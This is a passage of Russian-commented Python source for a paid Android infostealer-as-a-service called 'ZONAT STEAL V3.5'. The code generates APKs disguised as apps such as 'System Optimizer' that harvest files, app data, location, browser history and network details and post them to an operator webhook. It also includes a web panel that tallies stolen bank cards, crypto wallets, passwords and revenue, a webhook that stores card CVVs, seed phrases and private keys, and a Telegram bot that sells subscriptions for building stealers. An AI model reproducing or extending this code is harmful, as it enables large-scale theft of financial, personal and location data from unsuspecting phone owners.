                            if any(file.endswith(ext) for ext in key_extensions):
                                file_path = os.path.join(root, file)
                                try:
                                    # Читаем только небольшие файлы
                                    if os.path.getsize(file_path) < 1024 * 1024:  # 1MB
                                        with open(file_path, 'rb') as f:
                                            content = f.read()
                                        
                                        important_files.append({{
                                            "path": file_path,
                                            "name": file,
                                            "size": len(content),
                                            "content_b64": base64.b64encode(content).decode()[:5000]  # Ограничиваем размер
                                        }})
                                except:
                                    important_files.append({{
                                        "path": file_path,
                                        "name": file,
                                        "size": os.path.getsize(file_path) if os.path.exists(file_path) else 0,
                                        "error": "cannot_read"
                                    }})
                except:
                    continue
        
        return important_files
    
    def get_installed_apps(self):
        '''Получить список установленных приложений'''
        apps = []
        try:
            cmd = 'pm list packages -3'
            result = subprocess.check_output(cmd, shell=True).decode()
            packages = [line.replace('package:', '').strip() for line in result.split('\\n') if line]
            
            for pkg in packages[:100]:  # Ограничиваем 100 приложениями
                try:
                    # Получаем информацию о приложении
                    cmd = f'dumpsys package {pkg}'
                    info = subprocess.check_output(cmd, shell=True).decode()
                    
                    # Извлекаем имя приложения
                    app_name = pkg
                    for line in info.split('\\n'):
                        if 'versionName' in line:
                            app_name = line.split('=')[1].strip() if '=' in line else pkg
                            break
                    
                    apps.append({{
                        "package": pkg,
                        "name": app_name
                    }})
                except:
                    apps.append({{
                        "package": pkg,
                        "name": pkg
                    }})
        except:
            apps = []
        
        return apps
    
    def extract_app_data(self):
        '''Извлечь данные из популярных приложений'''
        app_data = {{}}
        
        # WhatsApp
        whatsapp_path = "/data/data/com.whatsapp"
        if os.path.exists(whatsapp_path):
            try:
                # База данных сообщений
                msgstore = os.path.join(whatsapp_path, "databases/msgstore.db")
                if os.path.exists(msgstore):
                    app_data["whatsapp"] = {{
                        "database": "found",
                        "size": os.path.getsize(msgstore)
                    }}
            except:
                pass
        
        # Telegram
        telegram_path = "/data/data/org.telegram.messenger"
        if os.path.exists(telegram_path):
            try:
                cache_path = os.path.join(telegram_path, "cache")
                if os.path.exists(cache_path):
                    app_data["telegram"] = {{
                        "cache": "found",
                        "files": len(os.listdir(cache_path)) if os.path.isdir(cache_path) else 0
                    }}
            except:
                pass
        
        return app_data
    
    def get_location(self):
        '''Получить местоположение'''
        location = {{}}
        try:
            # Пробуем получить через GPS
            cmd = 'dumpsys location'
            result = subprocess.check_output(cmd, shell=True).decode()
            
            # Ищем координаты в выводе
            import re
            lat_pattern = r'latitude=([-+]?\\d*\\.\\d+|\\d+)'
            lon_pattern = r'longitude=([-+]?\\d*\\.\\d+|\\d+)'
            
            lat_match = re.search(lat_pattern, result)
            lon_match = re.search(lon_pattern, result)
            
            if lat_match and lon_match:
                location = {{
                    "latitude": lat_match.group(1),
                    "longitude": lon_match.group(1),
                    "source": "gps"
                }}
        except:
            # Пробуем получить через сеть
            try:
                cmd = 'dumpsys netstats'
                result = subprocess.check_output(cmd, shell=True).decode()
                
                # Ищем информацию о сети
                if 'cell' in result.lower():
                    location = {{
                        "source": "network",
                        "status": "available"
                    }}
            except:
                location = {{"error": "cannot_get_location"}}
        
        return location
    
    def get_browser_history(self):
        '''Получить историю браузера'''
        history = []
        
        try:
            chrome_history = "/data/data/com.android.chrome/app_chrome/Default/History"
            if os.path.exists(chrome_history):
                try:
                    conn = sqlite3.connect(chrome_history)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                    rows = cursor.fetchall()
                    
                    for row in rows:
                        history.append({{
                            "url": row[0],
                            "title": row[1],
                            "time": row[2]
                        }})
                    
                    conn.close()
                except:
                    pass
        except:
            pass
        
        return history
    
    def get_screen_resolution(self):
        '''Получить разрешение экрана'''
        try:
            cmd = 'dumpsys window displays'
            result = subprocess.check_output(cmd, shell=True).decode()
            
            # Ищем разрешение в выводе
            import re
            res_pattern = r'(\\d+)x(\\d+)'
            match = re.search(res_pattern, result)
            
            if match:
                return f"{{match.group(1)}}x{{match.group(2)}}"
        except:
            pass
        
        return "unknown"
    
    def get_battery_level(self):
        '''Получить уровень батареи'''
        try:
            cmd = 'dumpsys battery'
            result = subprocess.check_output(cmd, shell=True).decode()
            
            for line in result.split('\\n'):
                if 'level' in line.lower():
                    level = line.split(':')[1].strip()
                    return f"{{level}}%"
        except:
            pass
        
        return "unknown"
    
    def get_storage_info(self):
        '''Получить информацию о хранилище'''
        try:
            cmd = 'df /data'
            result = subprocess.check_output(cmd, shell=True).decode()
            
            if result:
                lines = result.split('\\n')
                if len(lines) > 1:
                    parts = lines[1].split()
                    if len(parts) >= 4:
                        return {{
                            "total": parts[1],
                            "used": parts[2],
                            "free": parts[3]
                        }}
        except:
            pass
        
        return {{"total": "unknown", "used": "unknown", "free": "unknown"}}
    
    def get_memory_info(self):
        '''Получить информацию о памяти'''
        try:
            with open('/proc/meminfo', 'r') as f:
                meminfo = f.read()
            
            mem_data = {{}}
            for line in meminfo.split('\\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    mem_data[key.strip()] = value.strip()
            
            return mem_data
        except:
            pass
        
        return {{}}
    
    def get_network_info(self):
        '''Получить информацию о сети'''
        network_info = {{}}
        
        try:
            cmd = 'ip addr show'
            result = subprocess.check_output(cmd, shell=True).decode()
            
            # Ищем IP адрес
            import re
            ip_pattern = r'inet (\\d+\\.\\d+\\.\\d+\\.\\d+)'
            ip_match = re.search(ip_pattern, result)
            
            if ip_match:
                network_info["ip"] = ip_match.group(1)
            
            # Ищем MAC адрес
            mac_pattern = r'link/ether ([0-9a-f:]+)'
            mac_match = re.search(mac_pattern, result)
            
            if mac_match:
                network_info["mac"] = mac_match.group(1)
        
        except:
            pass
        
        # Информация о Wi-Fi
        try:
            cmd = 'dumpsys wifi'
            result = subprocess.check_output(cmd, shell=True).decode()
            
            if 'connected to' in result.lower():
                network_info["wifi"] = "connected"
            
            # Ищем SSID
            ssid_pattern = r'SSID: "([^"]+)"'
            ssid_match = re.search(ssid_pattern, result)
            
            if ssid_match:
                network_info["ssid"] = ssid_match.group(1)
        
        except:
            pass
        
        return network_info
    
    def send_data(self, data):
        '''Отправить данные на сервер'''
        try:
            import requests
            import threading
            
            def send():
                try:
                    response = requests.post(
                        self.webhook_url,
                        json=data,
                        timeout=30,
                        headers={{"User-Agent": "Android-Stealer/3.0"}}
                    )
                    
                    # Локальное сохранение если сервер не доступен
                    if response.status_code != 200:
                                        self.save_locally(data)
                
                except:
                    self.save_locally(data)
            
            # Отправляем в отдельном потоке
            thread = threading.Thread(target=send)
            thread.daemon = True
            thread.start()
            
        except:
            self.save_locally(data)
    
    def save_locally(self, data):
        '''Сохранить данные локально'''
        try:
            storage_path = "/sdcard/Android/data/com.android.system"
            os.makedirs(storage_path, exist_ok=True)
            
            filename = f"{{storage_path}}/data_{{int(time.time())}}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except:
            pass
    
    def encrypt_data(self, data):
        '''Шифрование данных'''
        try:
            key = hashlib.sha256(self.stealer_id.encode()).digest()[:32]
            cipher = AES.new(key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(json.dumps(data).encode(), AES.block_size))
            return base64.b64encode(cipher.iv + ct_bytes).decode()
        except:
            return json.dumps(data)
'''
    
    @staticmethod
    def generate_buildozer_spec(config):
        """генерация buildozer.spec"""
        name = config["name"].replace(" ", "").replace("-", "").lower()[:15]
        
        return f"""[app]
title = {config["name"]}
package.name = {name}
package.domain = org.{name}
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf
version = 1.0
requirements = python3,kivy==2.1.0,requests,pycryptodome
orientation = portrait
fullscreen = 0

[android]
arch = arm64-v8a
permissions = INTERNET,ACCESS_NETWORK_STATE,READ_CONTACTS,READ_SMS,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,CAMERA,READ_CALENDAR,WRITE_CALENDAR,READ_CALL_LOG
android.accept_sdk_license = true
android.api = 30
android.minapi = 21
android.sdk = 24
android.ndk = 23b
android.private_storage = true
android.allow_backup = true
android.allow_replication = true
"""
    
    @staticmethod
    def generate_utils():
        """утилиты"""
        return '''# Вспомогательные утилиты
import os
import sys
import json
import time

def log_message(message):
    """Логирование сообщений"""
    try:
        with open('/sdcard/log.txt', 'a', encoding='utf-8') as f:
            f.write(f"{time.time()}: {message}\\n")
    except:
        pass

def is_rooted():
    """Проверка root прав"""
    paths = [
        "/system/bin/su",
        "/system/xbin/su",
        "/sbin/su",
        "/system/app/Superuser.apk",
        "/system/app/SuperSU.apk"
    ]
    return any(os.path.exists(path) for path in paths)
'''
    
    @staticmethod
    def generate_manifest():
        """манифест"""
        return '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="org.stealer.app"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.READ_CALENDAR" />
    <uses-permission android:name="android.permission.WRITE_CALENDAR" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <application
        android:allowBackup="true"
        android:icon="@drawable/icon"
        android:label="System Optimizer"
        android:theme="@android:style/Theme.DeviceDefault.Light">
        
        <activity
            android:name="org.kivy.android.PythonActivity"
            android:configChanges="orientation|keyboardHidden|screenSize"
            android:label="System Optimizer"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".BackgroundService"
            android:enabled="true"
            android:exported="false" />
            
        <receiver android:name=".BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
        
    </application>
</manifest>
'''
    
    @staticmethod
    def create_default_icon(app_name):
        """создание дефолтной иконки"""
        img = Image.new('RGB', (512, 512), color='#2196F3')
        draw = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype("arial.ttf", 60)
        except:
            font = ImageFont.load_default()
        
        # Рисуем текст
        text = app_name[:3].upper() if len(app_name) > 2 else "APP"
        bbox = draw.textbbox((0, 0), text, font=font)
        text_width = bbox[2] - bbox[0]
        text_height = bbox[3] - bbox[1]
        
        position = ((512 - text_width) // 2, (512 - text_height) // 2)
        draw.text(position, text, fill='white', font=font)
        
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        return img_byte_arr.getvalue()

# ===== веб endpoints =====
@app.route('/')
def home():
    stats = db.get_system_stats()
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>ZONAT STEAL V3.5</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                color: #00ff9d;
                font-family: 'Courier New', monospace;
                margin: 0;
                padding: 20px;
                min-height: 100vh;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
            }
            .header {
                background: linear-gradient(135deg, #111 0%, #222 100%);
                padding: 40px;
                border-radius: 20px;
                border: 2px solid #00ff9d;
                margin-bottom: 30px;
                text-align: center;
                box-shadow: 0 10px 30px rgba(0, 255, 157, 0.2);
            }
            .title {
                font-size: 3em;
                color: #00ff9d;
                text-shadow: 0 0 20px #00ff9d;
                margin-bottom: 10px;
                background: linear-gradient(90deg, #00ff9d, #00b8ff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .subtitle {
                color: #88ffcc;
                font-size: 1.3em;
                margin-bottom: 20px;
                opacity: 0.9;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 25px;
                margin: 40px 0;
            }
            .stat-card {
                background: rgba(255, 255, 255, 0.05);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 15px;
                border: 1px solid rgba(0, 255, 157, 0.3);
                transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
                position: relative;
                overflow: hidden;
            }
            .stat-card::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 3px;
                background: linear-gradient(90deg, #00ff9d, #00b8ff);
                transform: scaleX(0);
                transition: transform 0.4s;
            }
            .stat-card:hover {
                border-color: #00ff9d;
                transform: translateY(-10px);
                box-shadow: 0 15px 35px rgba(0, 255, 157, 0.25);
            }
            .stat-card:hover::before {
                transform: scaleX(1);
            }
            .stat-number {
                font-size: 2.8em;
                color: #00ff9d;
                font-weight: bold;
                text-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
                margin-bottom: 10px;
            }
            .stat-label {
                color: #88ffcc;
                font-size: 1.1em;
                opacity: 0.9;
            }
            .btn-group {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 20px;
                margin: 50px 0;
            }
            .btn {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                background: linear-gradient(135deg, #00ff9d 0%, #00b8ff 100%);
                color: #000;
                padding: 18px 35px;
                border-radius: 12px;
                text-decoration: none;
                font-weight: bold;
                font-size: 1.2em;
                border: none;
                cursor: pointer;
                transition: all 0.3s;
                min-width: 200px;
                gap: 10px;
                box-shadow: 0 5px 15px rgba(0, 255, 157, 0.3);
}
            .btn:hover {
                transform: translateY(-5px) scale(1.05);
                box-shadow: 0 10px 25px rgba(0, 255, 157, 0.5);
                background: linear-gradient(135deg, #00b8ff 0%, #00ff9d 100%);
            }
            .admin-panel {
                background: rgba(255, 0, 0, 0.1);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 15px;
                border: 1px solid rgba(255, 0, 0, 0.3);
                margin: 40px 0;
            }
            .console {
                background: rgba(0, 0, 0, 0.7);
                color: #00ff9d;
                padding: 25px;
                border-radius: 15px;
                font-family: 'Consolas', monospace;
                margin-top: 40px;
                border: 1px solid rgba(0, 255, 157, 0.3);
                height: 300px;
                overflow-y: auto;
                position: relative;
            }
            .console::before {
                content: 'SYSTEM CONSOLE';
                position: absolute;
                top: -12px;
                left: 20px;
                background: #0a0a0a;
                padding: 0 15px;
                font-size: 0.9em;
                color: #00ff9d;
            }
            .blink {
                animation: blink 1s infinite;
            }
            @keyframes blink {
                0% { opacity: 1; }
                50% { opacity: 0.3; }
                100% { opacity: 1; }
            }
            .status-badge {
                display: inline-flex;
                align-items: center;
                padding: 8px 20px;
                background: rgba(0, 255, 0, 0.2);
                border-radius: 20px;
                margin: 10px;
                border: 1px solid rgba(0, 255, 0, 0.5);
            }
            .status-dot {
                width: 10px;
                height: 10px;
                background: #00ff00;
                border-radius: 50%;
                margin-right: 10px;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
                70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
                100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
            }
            footer {
                text-align: center;
                margin-top: 60px;
                color: #666;
                font-size: 0.9em;
                border-top: 1px solid rgba(255, 255, 255, 0.1);
                padding-top: 30px;
            }
            .feature-list {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 20px;
                margin: 40px 0;
            }
            .feature-item {
                background: rgba(255, 255, 255, 0.05);
                padding: 20px;
                border-radius: 10px;
                border-left: 4px solid #00ff9d;
            }
            .feature-title {
                color: #00ff9d;
                font-size: 1.2em;
                margin-bottom: 10px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1 class="title">🔥 ZONAT STEAL V3.5</h1>
                <p class="subtitle">Advanced Android Information Gathering System | Private Beta</p>
                <div style="margin-top: 25px;">
                    <span class="status-badge">
                        <span class="status-dot"></span>
                        SYSTEM ONLINE • {stats['total_installs']} DEVICES ACTIVE
                    </span>
                </div>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">{stats['total_users']}</div>
                    <div class="stat-label">👥 TOTAL USERS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{stats['total_stealers']}</div>
                    <div class="stat-label">🔧 ACTIVE STEALERS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{stats['total_data']}</div>
                    <div class="stat-label">💾 DATA RECORDS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{stats['total_banks']}</div>
                    <div class="stat-label">💳 BANK CARDS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{stats['total_crypto']}</div>
                    <div class="stat-label">₿ CRYPTO WALLETS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{stats['total_passwords']}</div>
                    <div class="stat-label">🔑 PASSWORDS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{stats['total_installs']}</div>
                    <div class="stat-label">📱 DEVICE INSTALLS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{stats['total_revenue']}₽</div>
                    <div class="stat-label">💰 TOTAL REVENUE</div>
                </div>
            </div>
            
            <div class="feature-list">
                <div class="feature-item">
                    <div class="feature-title">📱 FULL DEVICE ACCESS</div>
                    <p>Complete control over Android devices with root access detection</p>
                </div>
                <div class="feature-item">
                    <div class="feature-title">💳 BANKING DATA</div>
                    <p>Automatic extraction of bank cards, transactions and account data</p>
                </div>
                <div class="feature-item">
                    <div class="feature-title">₿ CRYPTO WALLETS</div>
                    <p>Extraction of seed phrases, private keys from all popular wallets</p>
                </div>
                <div class="feature-item">
                    <div class="feature-title">🔑 PASSWORDS & COOKIES</div>
                    <p>Stealing passwords, cookies, autofill data from all browsers</p>
                </div>
                <div class="feature-item">
                    <div class="feature-title">📸 MEDIA & FILES</div>
                    <p>Access to photos, videos, documents and important files</p>
                </div>
                <div class="feature-item">
                    <div class="feature-title">📱 APP DATA</div>
                    <p>Extraction of data from WhatsApp, Telegram, social media apps</p>
                </div>
                <div class="feature-item">
                    <div class="feature-title">📍 LOCATION TRACKING</div>
                    <p>Real-time GPS tracking and location history</p>
                </div>
                <div class="feature-item">
                    <div class="feature-title">📞 CALLS & MESSAGES</div>
                    <p>Access to call logs, SMS, and contact lists</p>
                </div>
            </div>
            
            <div class="btn-group">
                <a href="https://t.me/ZonatStealBot" class="btn" target="_blank">
                    🤖 OPEN TELEGRAM BOT
                </a>
                <a href="/admin" class="btn">
                    🔐 ADMIN PANEL
                </a>
                <a href="/api/docs" class="btn">
                    📡 API DOCS
                </a>
                <a href="/stats" class="btn">
                    📊 LIVE STATS
                </a>
            </div>
            
            <div class="admin-panel">
                <h3 style="color: #ff5555; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
                    🔐 ADMINISTRATOR ACCESS REQUIRED
                </h3>
                <p>Full system control available only for verified administrators with proper authentication.</p>
                <p style="background: rgba(255, 0, 0, 0.1); padding: 15px; border-radius: 8px; border: 1px solid rgba(255, 0, 0, 0.3);">
                    ⚠️ <b>WARNING:</b> This system is for authorized security testing only. Unauthorized access is strictly prohibited.
                </p>
            </div>
            
            <div class="console" id="console">
> System initialized... [OK]<br>
> Telegram bot connected... [OK]<br>
> Database connection established... [OK]<br>
> Webhook server listening... [OK]<br>
> {stats['total_stealers']} active stealers detected<br>
> {stats['total_installs']} devices connected<br>
> Waiting for new connections<span class="blink">_</span>
            </div>
            
            <footer>
                <p>© 2024 ZONAT STEAL V3.5 | PRIVATE BETA RELEASE | ALL RIGHTS RESERVED</p>
                <p style="color: rgba(255, 255, 255, 0.3); font-size: 0.8em; margin-top: 10px;">
                    This interface is for monitoring and control purposes only. All activities are logged.
                </p>
            </footer>
        </div>
        
        <script>
            const consoleEl = document.getElementById('console');
            const messages = [
                'New user registered in system',
                'Stealer APK generated successfully',
                'Bank data received from device',
                'Crypto wallet extracted',
                'Password database captured',
                'Location data updated',
                'File upload completed',
                'Payment processed successfully',
                'New device connected to network',
                'Data synchronization in progress',
                'System backup completed',
                'Security check passed'
            ];
            
            // Автогенерация логов
            setInterval(() => {
                if (Math.random() > 0.6) {
                    const time = new Date().toLocaleTimeString();
                    const msg = messages[Math.floor(Math.random() * messages.length)];
                    consoleEl.innerHTML += `> [${time}] ${msg}<br>`;
                    consoleEl.scrollTop = consoleEl.scrollHeight;
                }
            }, 2000);
            
            // Автообновление статистики
            setInterval(() => {
                fetch('/health')
                    .then(r => r.json())
                    .then(data => {
                        // Обновляем счетчики
                        document.querySelectorAll('.stat-number')[0].textContent = data.users;
                    })
                    .catch(() => {});
            }, 10000);
            
            // Анимация загрузки
            let dots = 0;
            setInterval(() => {
                const span = consoleEl.querySelector('.blink');
                dots = (dots + 1) % 4;
                span.textContent = '_'.repeat(dots);
            }, 500);
        </script>
    </body>
    </html>
    ''', stats=db.get_system_stats())

@app.route('/health')
def health():
    return jsonify({
        "status": "online",
        "version": VERSION,
        "timestamp": datetime.now().isoformat(),
        "users": db.get_system_stats()['total_users'],
        "stealers": db.get_system_stats()['total_stealers'],
        "installs": db.get_system_stats()['total_installs']
    })

@app.route('/webhook', methods=['POST'])
def webhook():
    """обработчик данных от стиллеров"""
    try:
        data = request.json
        logger.info(f"Webhook received from {data.get('stealer_id', 'unknown')}")
        
        stealer_id = data.get('stealer_id')
        device_id = data.get('device_id', 'unknown')
        
        # обновляем статистику стиллера
        db.update_stealer_stats(stealer_id)
        
        # определяем user_id из stealer_id
        c = db.conn.cursor()
        c.execute('SELECT user_id FROM stealers WHERE id = ?', (stealer_id,))
        result = c.fetchone()
              
        if result:
            user_id = result[0]
            
            # сохраняем основные данные
            db.add_stolen_data(stealer_id, user_id, device_id, 'full_collection', data)
            
            # обрабатываем банковские данные
            if 'banks' in data:
                for bank in data['banks']:
                    if 'cards' in bank:
                        for card in bank['cards']:
                            db.add_bank_data(user_id, stealer_id, {
                                'bank_name': bank.get('bank', 'unknown'),
                                'card_number': card.get('number'),
                                'expiry': card.get('expiry'),
                                'cvv': card.get('cvv'),
                                'owner': card.get('owner'),
                                'balance': card.get('balance'),
                                'country': card.get('country')
                            })
            
            # обрабатываем крипто данные
            if 'crypto' in data:
                for crypto in data['crypto']:
                    db.add_crypto_data(user_id, stealer_id, {
                        'type': crypto.get('wallet'),
                        'address': crypto.get('address'),
                        'private_key': crypto.get('private_keys', [''])[0] if crypto.get('private_keys') else '',
                        'seed': ' '.join(crypto.get('seeds', [])) if crypto.get('seeds') else '',
                        'balance': crypto.get('balance')
                    })
            
            # обрабатываем пароли
            if 'passwords' in data:
                for pwd in data['passwords']:
                    db.add_password_data(user_id, stealer_id, {
                        'website': pwd.get('website'),
                        'username': pwd.get('username'),
                        'password': pwd.get('password'),
                        'cookies': pwd.get('cookies', {}),
                        'autofill': pwd.get('autofill', {})
                    })
            
            # отправляем уведомление в телеграм
            try:
                user = db.get_user(user_id)
                if user and db.check_subscription(user_id):
                    # формируем сообщение
                    msg = f"📡 <b>НОВЫЕ ДАННЫЕ ПОЛУЧЕНЫ</b>\n\n"
                    msg += f"🔧 Стиллер: <code>{stealer_id[:8]}...</code>\n"
                    msg += f"📱 Устройство: <code>{device_id[:12]}</code>\n"
                    
                    if 'banks' in data:
                        msg += f"💳 Карт: {len(data['banks'])}\n"
                    
                    if 'crypto' in data:
                        msg += f"₿ Кошельков: {len(data['crypto'])}\n"
                    
                    if 'passwords' in data:
                        msg += f"🔑 Паролей: {len(data['passwords'])}\n"
                    
                    if 'files' in data:
                        msg += f"📁 Файлов: {len(data['files'])}\n"
                    
                    msg += f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
                    msg += f"<code>/data_{stealer_id[:8]}</code> - для просмотра"
                    
                    bot.send_message(user_id, msg, parse_mode='HTML')
            
            except Exception as e:
                logger.error(f"Failed to send notification: {e}")
        
        return jsonify({"status": "success", "message": "data_received"}), 200
    
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/download/apk/<stealer_id>')
def download_apk(stealer_id):
    """скачивание APK проекта"""
    try:
        # получаем конфиг стиллера
        c = db.conn.cursor()
        c.execute('SELECT config FROM stealers WHERE id = ?', (stealer_id,))
        result = c.fetchone()
        
        if not result:
            return "Stealer not found", 404
        
        config = json.loads(result[0])
        
        # генерируем APK проект
        apk_project = APKGenerator.generate_apk_project(config)
        
        # возвращаем zip архив
        return send_file(
            io.BytesIO(apk_project['zip_data']),
            as_attachment=True,
            download_name=apk_project['filename'],
            mimetype='application/zip'
        )
    
    except Exception as e:
        logger.error(f"APK download error: {e}")
        return "Internal server error", 500

@app.route('/api/data/<stealer_id>')
def get_stealer_data(stealer_id):
    """получить данные стиллера"""
    # TODO: реализовать с авторизацией
    return jsonify({"message": "API endpoint"})

# ===== телеграм бот =====
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or f'user_{user_id}'
    
    # регистрация
    db.create_user(user_id, username)
    user = db.get_user(user_id)
    
    has_sub = db.check_subscription(user_id)
    stats = db.get_user_stats(user_id)
    
    # клавиатура
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    if user['is_admin']:
        buttons = [
            '👑 АДМИН', '🔧 СОЗДАТЬ СТИЛЛЕР',
            '📊 МОИ СТИЛЛЕРЫ', '💳 БАНКОВСКИЕ ДАННЫЕ',
            '₿ КРИПТО КОШЕЛЬКИ', '🔑 ПАРОЛИ',
            '📁 ФАЙЛЫ', '📈 СТАТИСТИКА',
            '⚙️ НАСТРОЙКИ', '🆘 ПОМОЩЬ'
        ]
    else:
        buttons = [
            '🔧 СОЗДАТЬ СТИЛЛЕР', '📊 МОИ СТИЛЛЕРЫ',
            '💳 БАНКОВСКИЕ ДАННЫЕ', '₿ КРИПТО',
            '🔑 ПАРОЛИ', '📁 ФАЙЛЫ',
            '👤 ПРОФИЛЬ', '💳 ПОДПИСКА',
            '🆘 ПОДДЕРЖКА'
        ]
    
    for i in range(0, len(buttons), 2):
        markup.add(*[types.KeyboardButton(btn) for btn in buttons[i:i+2]])
    
    # приветствие
    welcome = f"""
    🚀 <b>Добро пожаловать в {VERSION}</b>
    
    👤 <b>Пользователь:</b> @{username}
    🆔 <b>ID:</b> <code>{user_id}</code>
    📅 <b>Регистрация:</b> {user['reg_date'][:10]}
    
    📊 <b>Ваша статистика:</b>
    • 🔧 Стиллеров: {stats['stealers']}
    • 📱 Установок: {stats['installs']}
    • 💳 Карт: {stats['banks']}
    • ₿ Кошельков: {stats['crypto']}
    • 🔑 Паролей: {stats['passwords']}
    
    ⏱️ <b>Статус подписки:</b> {"🟢 АКТИВНА" if has_sub else "🔴 ЗАКОНЧИЛАСЬ"}
    
    <b>Основные функции:</b>
    • 📱 Полный доступ к устройству
    • 💳 Авто-кража банковских карт
    • ₿ Извлечение крипто кошельков
    • 🔑 Кража паролей и cookies
    • 📸 Доступ к камере и микрофону
    • 📍 Отслеживание местоположения
    • 📞 Чтение SMS и звонков
    • 📁 Доступ к файлам
    
    <b>Бесплатный период:</b> {FREE_TRIAL_HOURS} часов
    """
    
    if not has_sub and not user['is_admin']:
        welcome += f"\n\n⚠️ <b>После окончания пробного периода требуется подписка</b>"
    
    bot.send_message(user_id, welcome, parse_mode='HTML', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '🔧 СОЗДАТЬ СТИЛЛЕР')
def create_stealer_start(message):
    user_id = message.from_user.id
    
    if not db.check_subscription(user_id) and not db.get_user(user_id)['is_admin']:
        bot.send_message(user_id, "⛔ Требуется активная подписка!")
        return
    
    db.set_session(user_id, 'awaiting_name')
    
    bot.send_message(user_id,
        "🔧 <b>СОЗДАНИЕ НОВОГО СТИЛЛЕРА</b>\n\n"
        "Введите название для вашего стиллера:\n"
        "<i>Пример: System Update, Media Player, Security Optimizer</i>",
        parse_mode='HTML')

@bot.message_handler(func=lambda message: db.get_session(message.from_user.id) and db.get_session(message.from_user.id)['step'] == 'awaiting_name')
def process_name(message):
    user_id = message.from_user.id
    name = message.text.strip()
    
    if len(name) < 2:
        bot.send_message(user_id, "❌ Слишком короткое название. Минимум 2 символа.")
        return
    
    db.set_session(user_id, 'awaiting_icon', {'name': name})
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton('🖼️ Отправить иконку', callback_data='send_icon'),
        types.InlineKeyboardButton('⏭️ Пропустить', callback_data='skip_icon')
    )
    
    bot.send_message(user_id,
        f"✅ <b>Название принято:</b> {name}\n\n"
        "🖼️ <b>Шаг 2: Иконка приложения</b>\n\n"
        "Отправьте квадратное изображение (PNG) для иконки или пропустите этот шаг:",
        parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'skip_icon')
def skip_icon_callback(call):
    user_id = call.from_user.id
    session = db.get_session(user_id)
    
    if session:
        session_data = session['data']
        db.set_session(user_id, 'awaiting_config', session_data)
        
        show_config_menu(call.message)

def show_config_menu(message):
    user_id = message.chat.id
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
